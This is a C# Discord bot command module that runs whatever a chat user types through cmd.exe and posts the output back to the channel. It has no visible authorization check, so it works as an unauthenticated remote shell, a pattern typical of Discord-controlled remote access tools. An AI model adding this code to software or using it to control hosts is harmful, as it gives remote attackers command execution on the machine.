using Discord;
using Discord.Commands;
using System.Diagnostics;
using System.Text;

namespace Main.Source.Bot.Commands
{
    public class Shell : CommandBase
    {
        public override string Name => "shell";
        public override string Info => "Executes commands from cmd";
        public override string Use => "Anything";

        public override async Task Func(SocketCommandContext socket, string[] args)
        {
            if (args.Length < 1)
            {
                await socket.Message.ReplyAsync("Usage: " + Use);
                return;
            }

            string command = string.Join(" ", args);

            using var process = Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/C " + command,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            });

            if (process == null)
            {
                await socket.Message.ReplyAsync("Failed to run command");
                return;
            }

            string output = await process.StandardOutput.ReadToEndAsync();
            string error = await process.StandardError.ReadToEndAsync();

            await process.WaitForExitAsync();

            string result = string.IsNullOrEmpty(output) ? error : output;
            if (string.IsNullOrEmpty(result))
            {
                result = "No output";
            }

            if (output.Length > 1900 + command.Length + 2)
            {
                using (var stream = new MemoryStream(Encoding.UTF8.GetBytes(result)))
                {
                    await socket.Channel.SendFileAsync(
                        stream: stream,
                        filename: "out.txt",
                        text: $"`{command}`",
                        messageReference: new MessageReference(socket.Message.Id)
                    );
                }
            }
            else
            {
                await socket.Message.ReplyAsync($"`{command}`\n```\n{result}\n```");
            }
        }
    }
}
